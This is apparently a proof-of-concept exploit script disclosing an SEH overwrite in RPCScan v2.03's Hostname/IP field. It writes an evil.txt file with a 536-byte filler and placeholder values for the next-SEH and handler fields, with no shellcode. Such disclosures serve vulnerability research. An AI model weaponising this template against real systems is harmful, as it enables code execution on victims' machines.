#!/usr/bin/python
# Exploit Title     : RPCScan v2.03 Hostname/IP Field SEH Overwrite POC
# Discovery by      : Nipun Jaswal
# Email             : mail@nipunjaswal.info
# Discovery Date    : 08/05/2016
# Vendor Homepage   : http://samspade.org
# Software Link     : http://www.mcafee.com/in/downloads/free-tools/rpcscan.aspx#
# Tested Version    : 2.03
# Vulnerability Type: SEH Overwrite POC
# Tested on OS      : Windows 7 Home Basic
# Steps to Reproduce: Copy contents of evil.txt file and paste in the Hostname/IP Field. Press ->
##########################################################################################
#  -----------------------------------NOTES----------------------------------------------#
##########################################################################################

#SEH chain of main thread
#Address    SE handler
#0012FAA0   43434343
#42424242   *** CORRUPT ENTRY ***

# Offset to the SEH Frame is 536
buffer = "A"*536
# Address of the Next SEH Frame
nseh = "B"*4
# Address to the Handler Code, Generally P/P/R Address
seh = "C" *4
f = open("evil.txt", "wb")
f.write(buffer+nseh+seh)
f.close()
